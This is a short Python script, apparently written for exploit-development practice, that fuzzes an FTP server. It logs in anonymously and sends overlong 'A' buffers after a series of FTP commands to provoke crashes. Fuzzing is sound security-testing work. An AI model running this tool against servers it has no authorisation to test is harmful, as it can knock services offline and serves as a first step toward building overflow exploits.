#!/usr/bin/env python
"""
Description: Post-Authentication FTP Fuzzer
Author: Cody Winkler
Contact: @c2thewinkler (twitter)
Date: 11/26/2019
"""

import socket
from struct import pack
import sys

host = sys.argv[1]
port = int(sys.argv[2])


username = "USER anonymous\r\n"
password = "PASS test\r\n"

buffer = "A"*1000
buffer += "\r\n"

commands = ["STOR ", "SIZE ", "SYST ", "MLIST ", "PWD ", "DIR ", "UMASK ", "RENAME ", "ACCT ", "ABOR ", "HOST ", "APPE ", "RMD ", "LS ", "GET ", "PUT ", "PASS "]

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print s.recv(1024)
    s.send(username)
    print s.recv(1024)
    s.send(password)
    s.recv(1024)

    for command in commands:
        s.send(command + buffer)
        print "[+] Sent " + command + "payload with length: %d" % len(buffer)

    s.close()
except:
    print "[-] Something went wrong :("
